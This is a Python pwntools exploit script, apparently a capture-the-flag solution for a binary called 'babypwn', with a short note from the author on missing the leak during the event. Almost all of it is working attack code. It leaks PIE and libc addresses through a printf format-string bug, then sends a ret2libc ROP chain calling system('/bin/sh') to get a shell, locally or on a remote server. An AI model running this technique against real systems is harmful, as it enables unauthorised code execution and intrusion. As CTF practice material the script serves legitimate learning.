#!/usr/bin/python3
# @author: CryptoCat (https://github.com/Crypto-Cat/CTF/tree/main/pwn)
# Modified by An00bRektn
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe, level='warn')
    p.sendlineafter(b'>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify GDB script here (breakpoints etc)
gdbscript = '''
continue
'''.format(**locals())

# Binary filename
exe = './babypwn'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

"""
    Thoughts:
    I did not solve this challenge during the event because I was too stupid
    to realize that the printf vulnerability could have been used to leak out
    both the PIE base and the libc address. The fact that this is in Rust really
    doesn't matter because we're given the source code, and it's just a regular ret2libc.

    This is just a reminder that when doing pwn, or any challenge really, we should be thinking about what's actually
    happening as opposed to copying and pasting a formula.
"""

# Lib-C library, can use pwninit/patchelf to patch binary
libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

# Pass in pattern_size, get back EIP/RIP offset
offset = 96

# Start program
io = start()

io.sendlineafter(b'?', b'%2$p.%30$p')
io.recvuntil(b'Hi, ')

libc_leak, pie_leak = [int(x, 16) for x in io.recvlineS().split('.')]

elf.address = pie_leak - 0x464f8
libc.address = libc_leak + 0x1440    # use gdb
info("piebase: %#x", elf.address)
info("libc   : %#x", libc.address)

bin_sh = 0x1b45bd + libc.address
system = 0x52290 + libc.address

pop_rdi = 0x51d1 + elf.address
ret = 0x501a + elf.address

# Build the payload
payload = flat({
    offset: [
        ret,
        pop_rdi,
        bin_sh,
        system
    ]
})

# Send the payload
io.sendlineafter(b'emote?', payload)
io.recvuntil(b'..--++++--.')

# Got Shell?
io.interactive()
